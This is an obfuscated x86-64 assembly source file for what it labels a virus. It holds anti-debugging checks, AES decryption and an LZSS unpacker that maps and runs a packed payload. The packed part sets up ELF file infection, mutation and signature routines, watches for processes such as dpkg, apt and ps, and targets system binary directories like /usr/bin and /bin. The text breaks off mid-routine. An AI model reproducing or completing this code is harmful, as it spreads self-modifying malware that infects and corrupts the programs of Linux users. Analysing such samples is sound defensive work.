    jmp         ..@OYs0fd81OapY
..@HrMa29rYcDuQ:
    pop         rbx
    js          ..@ZvUhKRP04VYT
    jns         ..@ZvUhKRP04VYT
..@7dVTGqExoGZi:
    movdqu      OWORD [rsp+0x90],xmm0
    jmp         $+4
db 0x69, 0xdb
    jl          ..@zT9a7XgHOs0m
    jge         ..@zT9a7XgHOs0m
..@RRIbyau6sirU:
    xchg        rbx, rbx
    jb          ..@6UQafrByckDp
    jae         ..@6UQafrByckDp
..@43jskOFVRywT:
    jz          ..@UmIUWPzV7oF8
    jmp         ..@07KEfpEYcmmF
..@l0ulnvQfcsoh:
%ifndef ENABLE_DEBUGGING
    call        GetEnv
%endif
    jmp         $+3
db 0x1a
    jmp         ..@uMpYeRlZvL6N
..@gOCX4Z7dW0xS:
    push        r1
    call        Strlen
    push        rdi
    jmp         $+5
db 0x05, 0xcb, 0x18
    jl          ..@fR1kDjWfPlV9
    jge         ..@fR1kDjWfPlV9
AntiDebugging:
    jmp         ..@X42bqLDwtk3R
..@zT9a7XgHOs0m:
    movdqu      xmm1, OWORD [rsp+0xa0]
    jb          ..@XQBCsKwxvROB
    jae         ..@XQBCsKwxvROB
..@uMpYeRlZvL6N:
%ifndef ENABLE_DEBUGGING
    test        rax, rax
%endif
    jmp         ..@DittWc1Hav0L
..@MN5MifF1OecQ:
    jz          ..@dkJK5gxBcywJ
    js          ..@0aLVTe3IjNOd
    jns         ..@0aLVTe3IjNOd
..@E4fIHvK33Rft:
    pxor        xmm3, xmm4
    jmp         $+5
db 0x46, 0x74, 0x80
    jmp         $+3
db 0x0f
    jb          ..@OjoqEGvYuySG
    jae         ..@OjoqEGvYuySG
..@6UQafrByckDp:
    mov         rdx, rdx
    ret
    jmp         $+3
db 0xf1
    je          ..@2UskHexg6DH2
    jne         ..@2UskHexg6DH2
..@wke2ekeX4mKd:
    push        rdx
    jmp         ..@7YX7anEgMgJm
..@N7uS2D1GvHLw:
    ret
    jmp         Aes256KeyExpansion
..@KXIgwdQ4ddil:
    movdqa      OWORD [rsi+0xe0], xmm1
    ret
    push        rdx
    jb          ..@M2N7F2XiA2br
    jae         ..@M2N7F2XiA2br
..@pPsWpyBclGtK:
    VAR         public, key
    jmp         $+5
db 0x2b, 0x08, 0x9b
    jmp         ..@zbpDWyWJNOpD
..@QOb075Ffr4Fe:
    mov         r1, r5
    mov         r3, 111b
    jmp         $+5
db 0x9a, 0x82, 0x69
    jmp         $+3
db 0xda
    jl          ..@7za2cbSR6slo
    jge         ..@7za2cbSR6slo
..@blnNbQeuAQPk:
    INIT_MX_VAR
    mov         vsp, rdi
    mov         rcx, rcx
    jmp         $+5
db 0x18, 0x39, 0x93
    jl          ..@4HU9hKiebiBt
    jge         ..@4HU9hKiebiBt
..@X42bqLDwtk3R:
    xor          r1, r1
    jmp         $+5
db 0x76, 0xfb, 0x14
    jl          ..@VH6rwPb8L0so
    jge         ..@VH6rwPb8L0so
..@oKaYweOpuSZa:
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0xb0]
    aesdec      xmm0, xmm1
    jmp         $+3
db 0xd4
    jmp         $+5
db 0x33, 0x0b, 0xe9
    js          ..@ZRfMln4pRzuQ
    jns         ..@ZRfMln4pRzuQ
..@3qtdjrxXGxxW:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         rax, rax
%endif
%endif
    jmp         ..@S1RZVHDY54An
..@zBQDeJZHQ7cg:
    aesdec      xmm0, xmm1
    jmp         ..@MiidWcuPNjAl
..@flCaQ4eIvyiJ:
    pop         rdi
    xchg        rax, rax
    movdqu      OWORD [rsp+0x70],xmm0
    jmp         $+3
db 0x43
    jl          ..@Vrn0XVU6aWSi
    jge         ..@Vrn0XVU6aWSi
..@OjoqEGvYuySG:
    pslldq      xmm4, 0x4
    jb          ..@ECewkktzoZF4
    jae         ..@ECewkktzoZF4
..@ruxryoGXZ1v8:
    add         rdi, bytes
    cmp         QWORD [rdi], 0x00
    jb          ..@4rzfZAWQ2RFz
    jae         ..@4rzfZAWQ2RFz
..@M8ZW98MwwSk4:
    pop         rdx
    pshufd      xmm2, xmm2, 0xff
    movdqa      xmm4, xmm1
    js          ..@rTWmSed5BYKJ
    jns         ..@rTWmSed5BYKJ
..@1d2P4OHBalxH:
    syscall
    jmp         $+5
db 0xce, 0x09, 0x21
    jl          ..@slQkn49Ef0l4
    jge         ..@slQkn49Ef0l4
..@EiI73cP3DkrH:
    movdqu      OWORD [r1+0x10], xmm1
    jl          ..@biR2IgXIv3H5
    jge         ..@biR2IgXIv3H5
..@hkN8QrIbNCTu:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    add         rsp, bytes
    test        eax, eax
    jnz         ..@t4PI6VLOitT0
%endif
%endif
    je          ..@DnxlqMrNJC8o
    jne         ..@DnxlqMrNJC8o
;-----------------------------------------------------
; ENCRYPTED PART (The code below is encrypted but not 
; packed)
_decrypt:
;-----------------------------------------------------
; Encrypted Structures.
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Encrypted Proprocessor values.
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Encrypted code.
;-----------------------------------------------------
UnpackExecutableCode:
    jmp         ..@Z0a9J1XG9S4T
..@Z673v58dSrek:
    xor         r1, r1
    jb          ..@jCxC2YZaY9hq
    jae         ..@jCxC2YZaY9hq
..@pSu8yw869dg8:
    mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jl          ..@B7TbjGqYgkhc
    jge         ..@B7TbjGqYgkhc
..@9E6IfAjCGqFA:
    xchg        rdx, rdx
    xor         r3, r3
    jmp         $+5
db 0xd7, 0x95, 0xf2
    jb          ..@wLnMCR6tc33c
    jae         ..@wLnMCR6tc33c
..@JBZIwsqr8U8B:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jb          ..@FtFFozRzc8Y8
    jae         ..@FtFFozRzc8Y8
..@CqxRfAbZUOve:
%ifdef X86_32
    pop         rdi
    mov         ecx, original_virus_len-non_packed_len
%endif
    js          ..@n0YP3Z0d8Cjq
    jns         ..@n0YP3Z0d8Cjq
..@6b4CDWCh1KQU:
    push        rax
    jb          ..@9skXppzcnCfa
    jae         ..@9skXppzcnCfa
..@6XCpTKVFiDVU:
    push        rdi
    je          ..@suOaLcPATcak
    jne         ..@suOaLcPATcak
..@JdVFK645tTcd:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    jmp         $+3
db 0x9d
    jb          ..@EReFgGqDADlX
    jae         ..@EReFgGqDADlX
..@EReFgGqDADlX:
    mov         BYTE [rbx], al
    jmp         ..@WvJ5ScdmE8zY
..@E3b6VEjjdNwJ:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+5
db 0x38, 0x89, 0x2a
    jmp         ..@bnWmyGJSBaXd
..@ze5MWKGpHeYK:
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    je          ..@V19uP24wKmnf
    jne         ..@V19uP24wKmnf
..@9a3sbUlRN5Sn:
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    xchg        rsi, rsi
    jmp         ..@lcw5j9QZJ3wu
..@NuFRleAZeZuK:
    push        rdi
    js          ..@VZs8N1qlt5Ae
    jns         ..@VZs8N1qlt5Ae
..@o0QNhRRghKxb:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    mov         rdi, rdi
    jmp         $+3
db 0x59
    jmp         $+3
db 0xa1
    js          ..@la0BKH34cq9k
    jns         ..@la0BKH34cq9k
..@qbV6afEOTqHX:
    jg          ..@0COeu3FZrwNF
    jmp         $+5
db 0x4d, 0xd4, 0x45
    jb          ..@k1jthbRUdZ4H
    jae         ..@k1jthbRUdZ4H
..@kpPZlmp11Gcb:
    mov         rcx, 8
    call        ..@4ISouIxirQoS
    xor         rdi, rdi
    jb          ..@JdVFK645tTcd
    jae         ..@JdVFK645tTcd
..@nYXt3qsoGqsA:
    mov         rsi, rsi
    jmp         $+5
db 0xc7, 0x5b, 0x39
    jl          ..@Gcw1SyYy8cSz
    jge         ..@Gcw1SyYy8cSz
..@lcw5j9QZJ3wu:
    dec         QWORD [rsp+_LZSSD_OFF.length]
    jmp         $+4
db 0xa4, 0x5f
    js          ..@8rVPHnoONrEw
    jns         ..@8rVPHnoONrEw
..@bnWmyGJSBaXd:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         $+3
db 0xc2
    jl          ..@BANPHNvVOVZt
    jge         ..@BANPHNvVOVZt
..@HOrbVqpp8XJy:
    pop         rbx
    jl          ..@kS06wQjmkq2Z
    jge         ..@kS06wQjmkq2Z
..@dT8enY6vOoSB:
    xor         rdi, rdi
    jmp         $+5
db 0x4d, 0xf9, 0x5b
    js          ..@ePnRaSzqIclH
    jns         ..@ePnRaSzqIclH
..@la0BKH34cq9k:
    sub         rcx, 1
    jnz         ..@69ABsXsBL67h
    jmp         $+3
db 0x37
    jmp         ..@NuFRleAZeZuK
..@hIcKfZcFK61G:
    jmp         ..@5FvkRAAaobOb
    jmp         $+4
db 0x8a, 0x39
    jmp         $+3
db 0xb2
    jb          ..@MIiVsD93OWQf
    jae         ..@MIiVsD93OWQf
..@nnet6wmB9fua:
    call        ..@4ISouIxirQoS
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    jmp         ..@p4AceWDCkcqA
..@OtnlwsI3SQzC:
    mov         m8, rax
    jmp         ..@732M9OdNdRWh
..@PcFyQV9MLsnY:
%ifdef X86_32
    int         0x80
%endif
    jmp         $+4
db 0x73, 0x39
    jmp         $+4
db 0x9d, 0x38
    jmp         ..@WsXARspZE8qn
..@FtFFozRzc8Y8:
    mov         rbx, rbx
    jmp         $+4
db 0xc0, 0x8d
    jmp         ..@gLfoomx1fCHS
..@W95Uts6AGxjj:
    call        ..@4ISouIxirQoS
    mov         rsi, rax 
    jl          ..@nYXt3qsoGqsA
    jge         ..@nYXt3qsoGqsA
LzssDecoder:
    jmp         ..@i9OL6Mul6jmG
..@MIiVsD93OWQf:
    push        rbx
    jl          ..@HOrbVqpp8XJy
    jge         ..@HOrbVqpp8XJy
..@hKDLt6fsPeX3:
    add         rsp, _LZSSD_OFF_size
    jb          ..@gSZZXhCC2NXt
    jae         ..@gSZZXhCC2NXt
..@8rVPHnoONrEw:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    jmp         ..@LzOi3qVoRQtA
..@gLfoomx1fCHS:
    add         ecx, 1
    jl          ..@BgRnpxup9Cn4
    jge         ..@BgRnpxup9Cn4
..@9skXppzcnCfa:
    pop         rax
    xor         rax, rax
    jmp         $+4
db 0xfe, 0xcb
    je          ..@Gscw0f47H8JS
    jne         ..@Gscw0f47H8JS
..@8MIGZ14dghlN:
%ifdef X86_32
    xchg        rbx, rbx
%endif
    jl          ..@PcFyQV9MLsnY
    jge         ..@PcFyQV9MLsnY
..@3HAgCHuZOuA7:
    xchg        rax, rax
    mov         BYTE [rbx], al
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    jmp         $+4
db 0xb7, 0x61
    jb          ..@h56FLZkH1lKY
    jae         ..@h56FLZkH1lKY
..@PW8uixbhZh15:
    or          eax, 1
    js          ..@1HvIwRdPSmJs
    jns         ..@1HvIwRdPSmJs
..@PLI7WnbOfyy0:
    mov         rax, SYS_MUNMAP
    jmp         $+3
db 0xbb
    jmp         $+5
db 0x46, 0xc4, 0x27
    jmp         $+5
db 0x8a, 0x38, 0x25
    jl          ..@aN82yjmGPQOJ
    jge         ..@aN82yjmGPQOJ
..@p4AceWDCkcqA:
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    jl          ..@qbV6afEOTqHX
    jge         ..@qbV6afEOTqHX
..@SGOW0mKywjaq:
    jz          ..@MIiVsD93OWQf
    js          ..@kpPZlmp11Gcb
    jns         ..@kpPZlmp11Gcb
..@pxD3n6D4iA38:
    pop         rbx
    mov         rdx, rax
    jmp         $+4
db 0x31, 0xfd
    jb          ..@6b4CDWCh1KQU
    jae         ..@6b4CDWCh1KQU
..@ScIIrVA9N54X:
    call        LzssDecoder
    jmp         ..@9c8wkj5qE6NJ
..@w78nXuFbs36e:
    xor         rbx, rbx
    jmp         $+4
db 0xd3, 0xd3
    jl          ..@69ABsXsBL67h
    jge         ..@69ABsXsBL67h
..@JvU9wbo3iwCa:
    jnz         ..@LzOi3qVoRQtA
    jmp         $+4
db 0x80, 0xb8
    jmp         ..@U4lp9qUUBXL9
..@9C5T20g5hIBa:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    jmp         $+5
db 0xfd, 0x92, 0x7b
    jmp         $+4
db 0x07, 0x9e
    je          ..@TldzMzztSX8M
    jne         ..@TldzMzztSX8M
..@Gcw1SyYy8cSz:
    mov         rcx, LENGTH_BITS
    call        ..@4ISouIxirQoS
    je          ..@UX8kUrSGOz7R
    jne         ..@UX8kUrSGOz7R
..@KoEyLIDPYfCQ:
    xor         rax, rax
    xor         rdx, rdx
    jmp         $+5
db 0x0e, 0xc0, 0xa4
    jmp         ..@w78nXuFbs36e
..@wS15XBxAPn7T:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    js          ..@3HAgCHuZOuA7
    jns         ..@3HAgCHuZOuA7
..@0COeu3FZrwNF:
    test        rax, rax
    jmp         $+5
db 0x23, 0xde, 0x25
    jmp         $+4
db 0xbf, 0x6a
    jl          ..@SGOW0mKywjaq
    jge         ..@SGOW0mKywjaq
..@LzOi3qVoRQtA:
    shl         eax, 1
    jmp         $+3
db 0xf1
    jmp         $+4
db 0x45, 0x75
    jmp         ..@ze5MWKGpHeYK
..@5FvkRAAaobOb:
    mov         rcx, 1
    jmp         $+3
db 0x6e
    jmp         $+4
db 0xc9, 0xfb
    js          ..@nnet6wmB9fua
    jns         ..@nnet6wmB9fua
..@k1jthbRUdZ4H:
    jmp         ..@hKDLt6fsPeX3
    jmp         $+5
db 0xb0, 0x97, 0xff
    jmp         $+5
db 0xd2, 0x4d, 0xd6
    jmp         $+3
db 0xf1
    jmp         ..@4ISouIxirQoS
..@h56FLZkH1lKY:
    xor         rdi, rdi
    jmp         $+5
db 0xc0, 0x90, 0xaa
    jmp         $+4
db 0x14, 0xc1
    js          ..@uIgJ3ll62vkC
    jns         ..@uIgJ3ll62vkC
..@XTaHwwbXRuoL:
    xchg        rbx, rbx
    jmp         $+5
db 0xa4, 0x80, 0xf4
    jmp         $+4
db 0x83, 0x28
    jmp         ..@9C5T20g5hIBa
..@uIgJ3ll62vkC:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+5
db 0x83, 0xb1, 0xa9
    jb          ..@CcjZWtgDykRI
    jae         ..@CcjZWtgDykRI
..@ItvxA6XbpAaB:
    xor         r2, r2
    mov         r2d, DWORD [r5]
    jmp         $+3
db 0x12
    jmp         $+3
db 0xa2
    jl          ..@7X3X49uXtmQV
    jge         ..@7X3X49uXtmQV
..@TldzMzztSX8M:
    GGLOBAL     _packed
    mov         r1, r5
    GGLOBAL     virus_len
    jmp         $+4
db 0xd4, 0x4c
    jmp         ..@ItvxA6XbpAaB
..@1EXjBjIdl1Ss:
    pop         rsi
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    jmp         $+5
db 0x2e, 0xee, 0xe9
    jmp         $+5
db 0xe6, 0x1b, 0x9e
    jl          ..@svM3QiA9J9EL
    jge         ..@svM3QiA9J9EL
..@U4lp9qUUBXL9:
    push        rsi
    jb          ..@1EXjBjIdl1Ss
    jae         ..@1EXjBjIdl1Ss
..@69ABsXsBL67h:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    je          ..@JvU9wbo3iwCa
    jne         ..@JvU9wbo3iwCa
..@ekp3ADKeUdjq:
    call        ExitProgram
    jmp         $+4
db 0x9e, 0x6d
    jmp         LzssDecoder
..@Ej7DbzIn6jOq:
    jmp         ..@5FvkRAAaobOb
    jmp         ..@0COeu3FZrwNF
..@8DWc0AKIvTX9:
    mov         rsp, rsp
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    jmp         $+3
db 0x21
    jb          ..@x74X6JEOPenF
    jae         ..@x74X6JEOPenF
..@VZs8N1qlt5Ae:
    ret
    jmp         ..@hKDLt6fsPeX3
..@BANPHNvVOVZt:
    xchg        rsi, rsi
    jb          ..@hIcKfZcFK61G
    jae         ..@hIcKfZcFK61G
..@ePnRaSzqIclH:
    mov         rbx, rsi
    jl          ..@dGpz4GAifx7D
    jge         ..@dGpz4GAifx7D
..@CcjZWtgDykRI:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    inc         DWORD [rsp+_LZSSD_OFF.index]
    mov         rbx, rbx
    jmp         $+4
db 0x71, 0x2d
    jmp         ..@JBZIwsqr8U8B
..@gnhoQNwCKKtk:
    mov         rbp, rbp
    rep         stosb
    jmp         $+3
db 0x52
    je          ..@Ej7DbzIn6jOq
    jne         ..@Ej7DbzIn6jOq
..@wLnMCR6tc33c:
%ifdef X86_32
    push        rdi
%endif
    jmp         $+4
db 0xa2, 0xd2
    jmp         $+5
db 0xf8, 0x61, 0x9c
    jl          ..@CqxRfAbZUOve
    jge         ..@CqxRfAbZUOve
..@bXJIuHOmKqxF:
%ifdef X86_64
    syscall
%endif
    jmp         $+5
db 0x60, 0x27, 0x48
    jmp         ..@3ge6vBa2XdO0
..@dGpz4GAifx7D:
    add         bx, cx
    jmp         ..@N72djnu0aGVU
..@g88U1s8Plw8g:
    call        rax
    jmp         $+4
db 0xee, 0xbf
    jmp         $+4
db 0x93, 0x0f
    jmp         ..@oQjGohQuiREp
..@7X3X49uXtmQV:
    sub         r2, non_packed_len
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    js          ..@ScIIrVA9N54X
    jns         ..@ScIIrVA9N54X
..@x74X6JEOPenF:
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    mov         rcx, rcx
    jmp         $+4
db 0x61, 0x22
    jb          ..@pSu8yw869dg8
    jae         ..@pSu8yw869dg8
..@InBEDTcvcyGh:
    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    jmp         $+4
db 0x18, 0xbd
    jmp         ..@8DWc0AKIvTX9
..@pAePb5vcHSKQ:
    mov         dl, BYTE [rbx]
    jmp         ..@9a3sbUlRN5Sn
..@svM3QiA9J9EL:
    xchg        rbx, rbx
    jb          ..@pAePb5vcHSKQ
    jae         ..@pAePb5vcHSKQ
..@oQjGohQuiREp:
    xor         rax, rax
    jmp         $+3
db 0x4a
    jmp         $+4
db 0xbb, 0x01
    jmp         ..@6XCpTKVFiDVU
..@N72djnu0aGVU:
    and         bx, WINDOW_LENGTH-1
    xchg        rdi, rdi
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    jmp         $+5
db 0xe4, 0x67, 0xa2
    jmp         $+5
db 0x11, 0x57, 0x2c
    jmp         $+4
db 0xe4, 0xad
    jmp         ..@wS15XBxAPn7T
..@i9OL6Mul6jmG:
    sub         rsp, _LZSSD_OFF_size
    jmp         $+5
db 0xa2, 0x92, 0xcc
    jmp         $+5
db 0x11, 0x6d, 0x01
    jmp         ..@InBEDTcvcyGh
..@kS06wQjmkq2Z:
    mov         rcx, POSITION_BITS
    jmp         $+3
db 0xec
    jb          ..@W95Uts6AGxjj
    jae         ..@W95Uts6AGxjj
..@4hfAhktrYoIB:
%ifdef X86_32
    mov         edi, 0xffffffff
%endif
    jmp         $+5
db 0xe2, 0x39, 0x50
    jmp         $+5
db 0x3a, 0x99, 0xc2
    je          ..@yrkQDe5zebMh
    jne         ..@yrkQDe5zebMh
..@s5SDvFjR5FZW:
%ifdef X86_64
    mov         r10, 0x22
    mov         r8, 0xffffffffffffffff
%endif
    jmp         $+4
db 0x6b, 0xc9
    jmp         ..@7M3LUt7amTOM
..@jCxC2YZaY9hq:
    xor         r2, r2
    je          ..@9E6IfAjCGqFA
    jne         ..@9E6IfAjCGqFA
..@aN82yjmGPQOJ:
    syscall
    jmp         $+4
db 0xb1, 0x2d
    jmp         ..@WJJ5O89nRRux
..@3ge6vBa2XdO0:
    xchg        rax, rax
    jmp         $+4
db 0x85, 0xc9
    jmp         ..@XTaHwwbXRuoL
..@WsXARspZE8qn:
%ifdef X86_32
    pop         ebp
%endif
    js          ..@7uOoa79zjOx7
    jns         ..@7uOoa79zjOx7
..@WJJ5O89nRRux:
    sub         rsp, _UEC_OFF_size
    je          ..@ekp3ADKeUdjq
    jne         ..@ekp3ADKeUdjq
..@4ISouIxirQoS:
    mov         rax, rax
    pop         rdi
    jl          ..@KoEyLIDPYfCQ
    jge         ..@KoEyLIDPYfCQ
..@7uOoa79zjOx7:
%ifdef X86_64
    xor         r9, r9
    mov         esi, original_virus_len-non_packed_len
    mov         edx, 111b
%endif
    jmp         $+3
db 0x59
    jmp         $+5
db 0x32, 0x18, 0x56
    jb          ..@s5SDvFjR5FZW
    jae         ..@s5SDvFjR5FZW
..@n0YP3Z0d8Cjq:
%ifdef X86_32
    mov         edx, 111b
    mov         esi, 0x22
    mov         rbp, rbp
%endif
    jmp         $+5
db 0x9a, 0xa6, 0x14
    jmp         ..@4hfAhktrYoIB
..@gSZZXhCC2NXt:
    mov         rbx, rbx
    ret
..@7M3LUt7amTOM:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    js          ..@bXJIuHOmKqxF
    jns         ..@bXJIuHOmKqxF
..@v4HpsofW7JIt:
    jle         ..@ePnRaSzqIclH
    jmp         $+5
db 0x8b, 0x82, 0x4f
    jl          ..@5FvkRAAaobOb
    jge         ..@5FvkRAAaobOb
..@Kig8w5v2b7p4:
    xchg        rsp, rsp
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    mov         r2, original_virus_len-non_packed_len
    js          ..@PLI7WnbOfyy0
    jns         ..@PLI7WnbOfyy0
..@1HvIwRdPSmJs:
    push        rsi
    pop         rsi
    jmp         $+5
db 0x30, 0xdd, 0x42
    jmp         ..@o0QNhRRghKxb
..@yrkQDe5zebMh:
%ifdef X86_32
    push        ebp
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
%endif
    js          ..@8MIGZ14dghlN
    jns         ..@8MIGZ14dghlN
..@732M9OdNdRWh:
    mov         rbx, rbx
    jmp         ..@g88U1s8Plw8g
..@WvJ5ScdmE8zY:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         $+5
db 0x0a, 0xa2, 0xd7
    jmp         ..@E3b6VEjjdNwJ
..@V19uP24wKmnf:
    test        dl, dl
    jz          ..@1HvIwRdPSmJs
    je          ..@PW8uixbhZh15
    jne         ..@PW8uixbhZh15
..@9c8wkj5qE6NJ:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         $+4
db 0x56, 0xee
    jmp         $+5
db 0x71, 0xb4, 0x5f
    jmp         ..@OtnlwsI3SQzC
..@B7TbjGqYgkhc:
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    mov         rax, 0x20
    jmp         $+4
db 0xcf, 0x8a
    jmp         $+4
db 0x73, 0xe2
    jmp         $+4
db 0x6c, 0xf8
    jmp         ..@gnhoQNwCKKtk
..@Z0a9J1XG9S4T:
    xor         rax, rax
    jmp         ..@Z673v58dSrek
..@Gscw0f47H8JS:
    xor         rcx, rcx
    jl          ..@dT8enY6vOoSB
    jge         ..@dT8enY6vOoSB
..@suOaLcPATcak:
    pop         rdi
    jmp         $+5
db 0x56, 0x83, 0x53
    jmp         ..@Kig8w5v2b7p4
..@UX8kUrSGOz7R:
    add         rax, 1
    push        rbx
    jmp         $+3
db 0xc0
    jmp         ..@pxD3n6D4iA38
..@BgRnpxup9Cn4:
    cmp         cl, dl
    mov         rdi, rdi
    mov         rdi, rdi
    jmp         ..@v4HpsofW7JIt
;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    jmp         Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
    .key        resb 0x20
endstruc
struc _PAYLOAD_OFF
    .key        resb 0x20
    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _MUTA_OFF
    .start      resq 0x1
    .index      resd 0x1
    .size       resd 0x1
    .key        resq 0x1
    .random_BYTE resb 0x1
endstruc
struc _AESE_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
    .keyprev    resd 0x1
    .meta_ptr   resq 0x1
endstruc
struc _KEYGEN_OFF
    .bufferaddr resq 0x1
    .fd         resd 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs: 
proc6:      db "dpkg", 0
proc5:      db "apt", 0
proc4:      db "ps", 0
proc3:      db "grep", 0
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

bash:       db "/bin/bash", 0
urandom:    db "/dev/urandom", 0

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    jmp         ..@4Sz16hqk88cX
..@uBFh594mNFlw:
    rep         nop
    jmp         $+5
db 0x00, 0x35, 0x3a
    jmp         $+4
db 0x94, 0x22
    jmp         $+3
db 0x10
    jmp         ..@twNPcSBVKinp
..@oz511qsrLSXv:
    xor         rax, rax
    push        rcx
    pop         rcx
    jmp         $+3
db 0xe1
    jmp         ..@FFrcNFMlrf9R
..@uZHF8z3gw1Px:
    pop         rdi
    jmp         ..@roZex2SUEzRp
..@o2TH3e3SvPoT:
    movdqu      xmm0, [rsi+rcx]
    xchg        rsi, rsi
    jmp         $+3
db 0xde
    jmp         ..@ImMO7Vb0oTJH
..@S7L6vbg5uyin:
    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         $+4
db 0x35, 0x25
    jmp         $+3
db 0x9f
    jmp         ..@NKD1joOnFyDE
..@hZJb7OggblMZ:
    jl          ..@087OgNcsMnFp
    js          ..@J35L91EjBZ9C
    jns         ..@J35L91EjBZ9C
..@lcrduYrduDXT:
    mov         r3, _signature.startsize
    xchg        rsp, rsp
    jmp         ..@uYfWMCpnzVlL
..@QzKm4d3rPUvr:
%ifndef ENABLE_DEBUGGING
    mov         r1d, 0x2
    mov         r2d, 0x1
%endif
    jmp         $+3
db 0x2b
    jmp         ..@BR7tUzcuywg0
..@NGx5fmjWzAlS:
    call_vsp    ExitProgram
    je          ..@bDyBgTnpy7r7
    jne         ..@bDyBgTnpy7r7
..@hOhi6eYsseOE:
    push        rax
    pop         rax
    jmp         $+3
db 0x30
    jmp         ..@mI6wwuA1chAV
..@vWuaAj6NNfO3:
    push        rdi
    jmp         $+3
db 0x52
    jl          ..@G2LgWNp7GPbd
    jge         ..@G2LgWNp7GPbd
..@ohzhl1TUkyf2:
    mov         rax, rax
    jmp         $+3
db 0x65
    jmp         $+3
db 0x88
    jl          ..@koNinxZAnM6H
    jge         ..@koNinxZAnM6H
..@2ql7KcyziHQ3:
    pop         r2
    jmp         $+3
db 0x09
    jl          ..@jYl72Xhqg9He
    jge         ..@jYl72Xhqg9He
..@O3N5zD9ClF5G:
    cmp         rax, 0x02
    js          ..@JA8OvFhfyhxY
    jns         ..@JA8OvFhfyhxY
..@0wTskHBhFQpR:
    add         ecx, 1
